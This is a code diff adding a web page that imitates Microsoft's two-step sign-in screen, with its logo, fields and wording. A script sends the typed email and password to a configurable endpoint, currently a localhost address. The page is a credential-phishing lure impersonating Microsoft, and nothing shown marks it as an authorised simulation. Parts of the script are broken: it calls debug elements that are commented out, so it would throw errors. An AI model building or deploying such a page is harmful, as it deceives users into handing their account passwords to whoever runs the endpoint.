@@ -1,0 +1,479 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Two Step Microsoft Login</title>
+
+    <style>
+      .hidden {
+        display: none;
+      }
+    </style>
+  </head>
+
+  <body
+    style="
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f3f3f3;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background-image: url(./images/background.jpg);
+      background-size: cover;
+      background-position: center;
+    "
+  >
+    <div style="width: 440px">
+      <!-- FORM BOX -->
+      <div
+        style="
+          background: white;
+          padding: 40px;
+          box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        "
+      >
+        <!-- LOGO -->
+        <img
+          src="./images/ms_logo.svg"
+          alt="Microsoft Logo"
+          style="width: 110px; margin-bottom: 10px"
+        />
+
+        <!-- FORM -->
+        <form id="login-form">
+          <!-- EMAIL STEP -->
+          <div id="email-step">
+            <h1
+              style="
+                margin: 0 0 10px 0;
+                font-size: 1.5rem;
+                font-weight: 600;
+                color: #1b1b1b;
+                font-family:
+                  &quot;Segoe UI&quot;, &quot;Helvetica Neue&quot;,
+                  &quot;Lucida Grande&quot;, &quot;Roboto&quot;,
+                  &quot;Ebrima&quot;, &quot;Nirmala UI&quot;,
+                  &quot;Gadugi&quot;, sans-serif;
+              "
+            >
+              Sign in
+            </h1>
+
+            <input
+              id="email"
+              name="email"
+              type="email"
+              autocomplete="username"
+              placeholder="Email, phone, or Skype"
+              autofocus
+              style="
+                width: 100%;
+                border: none;
+                border-bottom: 1px solid #666;
+                padding: 10px 0;
+                font-size: 0.8125rem;
+                outline: none;
+              "
+            />
+
+            <div
+              id="email-error"
+              style="color: red; font-size: 0.75rem; margin-top: 8px"
+            ></div>
+
+            <p style="margin-top: 25px; color: #555; font-size: 0.8125rem">
+              No account?
+
+              <a href="#" style="color: #0067b8; text-decoration: none">
+                Create one!
+              </a>
+            </p>
+
+            <p>
+              <a
+                href="#"
+                style="
+                  color: #0067b8;
+                  text-decoration: none;
+                  font-size: 0.8125rem;
+                "
+              >
+                Can’t access your account?
+              </a>
+            </p>
+
+            <div
+              style="display: flex; justify-content: flex-end; margin-top: 30px"
+            >
+              <button
+                id="next-button"
+                type="button"
+                style="
+                  padding: 8px 35px;
+                  border: none;
+                  background: #0067b8;
+                  color: white;
+                  cursor: pointer;
+                "
+              >
+                Next
+              </button>
+            </div>
+          </div>
+
+          <!-- PASSWORD STEP -->
+          <div id="password-step" class="hidden">
+            <p
+              id="selected-email"
+              style="
+                color: #555;
+                margin-bottom: 10px;
+                font-size: 0.875rem;
+                cursor: pointer;
+              "
+            ></p>
+
+            <h1
+              style="
+                margin: 0 0 10px 0;
+                font-size: 1.5rem;
+                font-weight: 600;
+                color: #1b1b1b;
+                font-family:
+                  &quot;Segoe UI&quot;, &quot;Helvetica Neue&quot;,
+                  &quot;Lucida Grande&quot;, &quot;Roboto&quot;,
+                  &quot;Ebrima&quot;, &quot;Nirmala UI&quot;,
+                  &quot;Gadugi&quot;, sans-serif;
+              "
+            >
+              Enter password
+            </h1>
+
+            <input
+              type="password"
+              id="password"
+              placeholder="Password"
+              style="
+                width: 100%;
+                border: none;
+                border-bottom: 1px solid #666;
+                padding: 10px 0;
+                font-size: 0.8125rem;
+                outline: none;
+              "
+            />
+
+            <div id="result" style="margin-top: 10px; font-size: 0.75rem"></div>
+
+            <div
+              style="display: flex; justify-content: flex-end; margin-top: 30px"
+            >
+              <button
+                id="back-button"
+                type="button"
+                style="
+                  padding: 8px 25px;
+                  border: none;
+                  background: #ccc;
+                  margin-right: 10px;
+                  cursor: pointer;
+                "
+              >
+                Back
+              </button>
+
+              <button
+                id="submit-button"
+                type="submit"
+                style="
+                  padding: 8px 35px;
+                  border: none;
+                  background: #0067b8;
+                  color: white;
+                  cursor: pointer;
+                "
+              >
+                Sign in
+              </button>
+            </div>
+          </div>
+
+          <!-- HIDDEN SETTINGS -->
+          <div id="settings" style="display: none"></div>
+
+          <input
+            id="endpoint"
+            type="hidden"
+            value="http://localhost:8000/api/v1/verify-login"
+          />
+
+          <input id="api-key" type="hidden" value="" />
+
+          <button id="clear-button" type="button" style="display: none">
+            Clear
+          </button>
+
+          <!-- DEBUG
+          <details id="debug-details" class="hidden" style="margin-top: 20px">
+            <summary>Debug</summary>
+ 
+            <pre id="debug-output"></pre>
+          </details> -->
+        </form>
+      </div>
+
+      <!-- SIGN IN OPTIONS -->
+      <div
+        style="
+          margin-top: 20px;
+          background: white;
+          padding: 12px 34px;
+          box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          cursor: pointer;
+        "
+      >
+        <img
+          src="./images/key.svg"
+          style="width: 30px; height: 30px"
+          alt="Key Icon"
+        />
+
+        <span
+          style="
+            font-size: 1rem;
+            color: #1b1b1b;
+            font-family:
+              &quot;Segoe UI&quot;, &quot;Helvetica Neue&quot;,
+              &quot;Roboto&quot;, sans-serif;
+          "
+        >
+          Sign-in options
+        </span>
+      </div>
+    </div>
+
+    <script>
+      const form = document.querySelector("#login-form");
+      const settings = document.querySelector("#settings");
+      const emailStep = document.querySelector("#email-step");
+      const passwordStep = document.querySelector("#password-step");
+      const endpointInput = document.querySelector("#endpoint");
+      const apiKeyInput = document.querySelector("#api-key");
+      const emailInput = document.querySelector("#email");
+      const passwordInput = document.querySelector("#password");
+      const selectedEmail = document.querySelector("#selected-email");
+      const emailError = document.querySelector("#email-error");
+      const result = document.querySelector("#result");
+      const nextButton = document.querySelector("#next-button");
+      const backButton = document.querySelector("#back-button");
+      const clearButton = document.querySelector("#clear-button");
+      const submitButton = document.querySelector("#submit-button");
+      const debugDetails = document.querySelector("#debug-details");
+      const debugOutput = document.querySelector("#debug-output");
+
+      function setMessage(element, message, type) {
+        element.textContent = message;
+      }
+
+      function setBusy(isBusy) {
+        submitButton.disabled = isBusy;
+        submitButton.textContent = isBusy ? "Checking..." : "Submit";
+
+        backButton.disabled = isBusy;
+        clearButton.disabled = isBusy;
+      }
+
+      function showDebug(value) {
+        debugDetails.classList.remove("hidden");
+
+        debugOutput.textContent = JSON.stringify(value, null, 2);
+      }
+
+      function hideDebug() {
+        debugDetails.classList.add("hidden");
+        debugOutput.textContent = "";
+      }
+
+      function showEmailStep() {
+        passwordStep.classList.add("hidden");
+
+        emailStep.classList.remove("hidden");
+
+        settings.classList.remove("hidden");
+
+        setMessage(result, "", "");
+
+        hideDebug();
+
+        emailInput.focus();
+      }
+
+      function showPasswordStep() {
+        selectedEmail.textContent = emailInput.value.trim();
+
+        emailStep.classList.add("hidden");
+
+        settings.classList.add("hidden");
+
+        passwordStep.classList.remove("hidden");
+
+        setMessage(result, "", "");
+
+        hideDebug();
+
+        passwordInput.focus();
+      }
+
+      function getResponseMessage(response, body) {
+        if (body && typeof body === "object") {
+          return body.message || body.detail || body.error || body.statusText;
+        }
+
+        if (typeof body === "string" && body.trim()) {
+          return body.trim();
+        }
+
+        return response.ok ? "Login test completed." : "Request failed.";
+      }
+
+      async function parseResponse(response) {
+        const text = await response.text();
+
+        if (!text) return null;
+
+        try {
+          return JSON.parse(text);
+        } catch {
+          return text;
+        }
+      }
+
+      nextButton.addEventListener("click", () => {
+        const email = emailInput.value.trim();
+
+        setMessage(emailError, "", "");
+
+        if (!email) {
+          setMessage(emailError, "Enter an email address.", "error");
+
+          emailInput.focus();
+
+          return;
+        }
+
+        showPasswordStep();
+      });
+
+      emailInput.addEventListener("keydown", (event) => {
+        if (event.key === "Enter") {
+          event.preventDefault();
+
+          nextButton.click();
+        }
+      });
+
+      backButton.addEventListener("click", showEmailStep);
+
+      clearButton.addEventListener("click", () => {
+        passwordInput.value = "";
+
+        setMessage(result, "", "");
+
+        hideDebug();
+
+        passwordInput.focus();
+      });
+
+      form.addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        const email = emailInput.value.trim();
+
+        const password = passwordInput.value;
+
+        const endpoint = endpointInput.value;
+
+        const apiKey = apiKeyInput.value.trim();
+
+        setMessage(result, "", "");
+
+        hideDebug();
+
+        if (!password) {
+          setMessage(result, "Enter a password.", "error");
+
+          passwordInput.focus();
+
+          return;
+        }
+
+        setBusy(true);
+
+        setMessage(result, "Checking credentials...", "");
+
+        try {
+          const headers = {
+            "Content-Type": "application/json",
+          };
+
+          if (apiKey) {
+            headers["X-API-Key"] = apiKey;
+          }
+
+          const response = await fetch(endpoint, {
+            method: "POST",
+            headers,
+            body: JSON.stringify({
+              email,
+              password,
+            }),
+          });
+
+          const body = await parseResponse(response);
+
+          const responseDetails = {
+            endpoint,
+            httpStatus: response.status,
+            ok: response.ok,
+            body,
+          };
+
+          showDebug(responseDetails);
+
+          if (!response.ok) {
+            setMessage(result, getResponseMessage(response, body), "error");
+
+            return;
+          }
+
+          if (body && body.success === true) {
+            setMessage(result, getResponseMessage(response, body), "success");
+
+            return;
+          }
+
+          setMessage(
+            result,
+            getResponseMessage(response, body) ||
+              "Email or password is incorrect.",
+            "error",
+          );
+        } catch (error) {
+          setMessage(result, "Could not reach endpoint.", "error");
+
+          showDebug({
+            endpoint,
+            error: error.message,
+          });
+        } finally {
+          setBusy(false);
+        }
+      });
+    </script>
+  </body>
+</html>
